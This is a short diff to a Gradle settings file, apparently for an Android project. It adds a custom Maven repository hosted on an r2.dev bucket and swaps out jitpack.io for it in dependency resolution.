@@ -9,6 +9,9 @@ pluginManagement {
         }
         mavenCentral()
         gradlePluginPortal()
+        maven {
+            url = uri("https://pub-957216d6ed8342d5b731d2065c52a611.r2.dev/maven")
+        }
     }
 }
 plugins {
@@ -19,7 +22,9 @@ dependencyResolutionManagement {
     repositories {
         google()
         mavenCentral()
-        maven("https://jitpack.io")
+        maven {
+            url = uri("https://pub-957216d6ed8342d5b731d2065c52a611.r2.dev/maven")
+        }
     }
 }
 
